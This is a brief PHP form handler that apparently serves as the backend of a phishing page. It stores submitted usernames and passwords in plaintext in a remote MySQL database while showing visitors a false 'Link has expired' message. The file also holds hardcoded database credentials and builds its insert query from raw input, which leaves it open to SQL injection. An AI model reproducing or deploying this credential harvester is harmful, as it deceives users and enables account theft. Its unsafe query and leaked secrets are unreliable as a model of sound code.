<?php

if(isset($_POST['submit'])){

session_start();

$con = mysqli_connect('139.162.168.106','stbaugmb_harissak','Aroben11');
mysqli_select_db($con, 'stbaugmb_registration');

if($con){
    echo"Link has expired, please try again later";
} else {
    echo"Connection not sucessfuly";
}



$name= $_POST['user'];
$pass = $_POST['password'];

$reg = " insert into userinfo (username, password) values ('$name','$pass')";
mysqli_query($con,$reg);



}
?>